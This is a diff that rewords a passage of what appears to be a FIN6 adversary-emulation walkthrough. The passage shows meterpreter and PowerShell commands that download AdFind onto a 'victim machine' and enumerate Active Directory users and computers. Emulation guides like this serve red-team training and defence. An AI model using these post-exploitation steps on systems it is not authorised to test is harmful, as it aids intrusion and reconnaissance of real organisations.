@@ -146,7 +146,7 @@ Indeed, FIN6 is suspected to have utilized a tool called ADFind for performing n
 
 [**AdFind**](https://www.joeware.net/freetools/tools/adfind/) is a free command-line query tool that can be used for gathering information from Active Directory.
 
-On the <kbd>meterpreter></kbd> terminal, we will use PowerShell session instead to download AdFind on Windows directory. To enable PowerShell session, run the following commands:
+On the <kbd>meterpreter></kbd> terminal,  we will use a PowerShell session instead to download AdFind to the Windows directory. To enable the PowerShell session, execute the following commands:
 
 ```bash
 meterpreter > load powershell
@@ -155,7 +155,7 @@ meterpreter > powershell_shell
 PS > 
 ```
 
-Afterwards, execute the following command to start the installation process of AdFind on the target machine:
+Afterward, execute the following command to initiate the installation process of AdFind on the victim machine:
 
 ```ps
 $postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
@@ -166,19 +166,19 @@ Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Bo
 
 ### 2.2 - Account Discovery: Domain Account [**T1087.002**](https://attack.mitre.org/techniques/T1087/002/)
 
-FIN6 used AdFind to check for person objects on Active Directory, and output the results to a text file.
+FIN6 employed AdFind to search for person objects in Active Directory and saved the results to a text file.
 
 ```ps
 PS > adfind.exe -f "objectcategory=person" > ad_users.txt
 ```
 
-After running the command, we can view the contents of the output file with the `type` command:
+Once the command has been executed, you can view the contents of the output file using the `type` command.
 
 ```ps
 PS > type ad_users.txt
 ```
 
-We can use `Get-Content` `Select-String` to filter-out all of the user accounts.
+After obtaining the output file, you can use `Get-Content` in combination with `Select-String` in PowerShell to filter out and display only the user accounts from the results.
 
 ```ps
 PS > Get-Content ad_users.txt | Select-String "dn:CN="
@@ -188,7 +188,7 @@ PS > Get-Content ad_users.txt | Select-String "dn:CN="
 
 ### 2.3 - Remote System Discovery [**T1018**](https://attack.mitre.org/techniques/T1018/)
 
-FIN6 also observed to perform Remote System Discovery to identify computer objects on the domain.
+FIN6 has been observed conducting Remote System Discovery as part of their reconnaissance efforts. This involves identifying computer objects on the domain to gain insights into the various systems and devices present in the network. 
 
 ```ps
 PS > adfind.exe -f "objectcategory=computer" > ad_computers.txt
